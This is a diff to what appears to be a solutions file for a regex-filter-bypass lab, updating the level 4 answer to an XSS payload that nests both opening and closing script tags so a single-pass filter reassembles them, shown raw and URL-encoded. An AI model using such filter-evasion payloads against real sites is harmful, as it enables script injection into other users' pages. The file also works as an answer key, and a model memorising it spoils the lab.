@@ -25,10 +25,10 @@ Real-world WAF / regex bypass shapes: missing `/i`, slash separator, entity deco
 
 ### regexbypass-level4
 
-`/regexbypass/level4/?query=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/script%3E`
+`/regexbypass/level4/?query=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E`
 
-- payload: `<scr<script>ipt>alert(1)</script>`
-- context: single-pass `<script>` removal collapses to `<script>`
+- payload: `<scr<script>ipt>alert(1)</scr</script>ipt>`
+- context: single-pass removal of both `<script>` and `</script>`; nest both
 
 ### regexbypass-level5
 
